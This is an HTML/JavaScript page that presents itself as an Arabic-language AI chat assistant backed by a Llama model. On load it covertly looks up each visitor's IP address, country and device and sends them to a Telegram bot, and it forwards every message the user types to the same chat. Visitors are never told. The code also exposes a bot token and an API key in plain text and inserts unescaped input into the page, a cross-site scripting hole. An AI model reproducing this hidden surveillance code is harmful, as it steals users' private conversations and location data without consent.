<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SAIF PLUS AI</title>
    <style>
        :root { --bg: #000; --red: #ff0000; --glow: 0 0 15px #ff0000; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .mobile-wrapper { width: 100%; max-width: 400px; height: 95vh; border: 2px solid var(--red); box-shadow: var(--glow); display: flex; flex-direction: column; position: relative; border-radius: 10px; }
        .header { padding: 15px; text-align: center; color: var(--red); font-weight: bold; font-size: 1.4rem; border-bottom: 1px solid rgba(255,0,0,0.3); text-shadow: var(--glow); }
        #chat-box { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
        .msg { max-width: 80%; padding: 12px; border-radius: 8px; font-size: 14px; line-height: 1.5; }
        .received { align-self: flex-start; background: rgba(255,0,0,0.1); border: 1px solid var(--red); }
        .sent { align-self: flex-end; background: var(--red); color: white; box-shadow: 0 0 10px var(--red); }
        .input-bar { display: flex; border-top: 1px solid rgba(255,0,0,0.3); }
        #uInput { flex: 1; background: transparent; border: none; padding: 15px; color: white; outline: none; border-right: 1px solid var(--red); }
        .send-btn { background: var(--red); color: white; border: none; padding: 0 20px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="mobile-wrapper">
        <div class="header">SAIF AI</div>
        <div id="chat-box"></div>
        <div class="input-bar">
            <input type="text" id="uInput" placeholder="اكتب رسالتك..." onkeypress="if(event.key==='Enter') send()">
            <button class="send-btn" onclick="send()">ارسال</button>
        </div>
    </div>

    <script>
        // البيانات الخاصة بك
        const TT = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
        const ID = '1565935868';
        const GK = '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';
        
        let brain = [{ role: "system", content: "أنت SAIF PLUS AI مساعد ذكي بلهجة خليجية." }];

        // وظيفة إرسال الإشعارات
        function logToTelegram(text) {
            const url = `https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
            fetch(url, { mode: 'no-cors' }).catch(err => console.log("Telegram Error"));
        }

        // تحديد نوع الجهاز
        function getDevice() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "أندرويد 📱";
            if (/iPad|iPhone|iPod/.test(ua)) return "آيفون 🍎";
            return "كمبيوتر 💻";
        }

        // تشغيل النظام فور التحميل
        window.onload = async function() {
            const box = document.getElementById('chat-box');
            
            // 1. إظهار رسالة الترحيب فوراً
            box.innerHTML += `<div class="msg received">👋 مرحباً بك في <b>SAIF AI</b>. كيف يمكنني مساعدتك اليوم؟</div>`;

            // 2. محاولة جلب الـ IP وإرسال التنبيه في الخلفية
            try {
                const device = getDevice();
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const flag = d.country_code ? d.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🌐";
                
                const report = `🔔 <b>تنبيه دخول جديد</b>\n\n📍 الدولة: ${d.country_name} ${flag}\n📱 الجهاز: ${device}\n🌐 الآيبي: <code>${d.ip}</code>`;
                logToTelegram(report);
            } catch (e) {
                logToTelegram(`🔔 زائر دخل الموقع من جهاز: ${getDevice()}`);
            }
        };

        // وظيفة إرسال الرسائل
        async function send() {
            const input = document.getElementById('uInput');
            const box = document.getElementById('chat-box');
            const val = input.value.trim();
            if(!val) return;

            box.innerHTML += `<div class="msg sent">${val}</div>`;
            input.value = "";
            box.scrollTop = box.scrollHeight;
            
            logToTelegram(`📩 <b>رسالة:</b> ${val}`);
            brain.push({ role: "user", content: val });

            try {
                const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                    method: "POST",
                    headers: { "Authorization": `Bearer ${GK}`, "Content-Type": "application/json" },
                    body: JSON.stringify({ model: "llama-3.3-70b-versatile", messages: brain })
                });
                const data = await response.json();
                const reply = data.choices[0].message.content;
                box.innerHTML += `<div class="msg received">${reply}</div>`;
                box.scrollTop = box.scrollHeight;
                brain.push({ role: "assistant", content: reply });
            } catch(e) {
                box.innerHTML += `<div class="msg received">عذراً، حدث خطأ في الاتصال بالذكاء الاصطناعي.</div>`;
            }
        }
    </script>
</body>
</html>
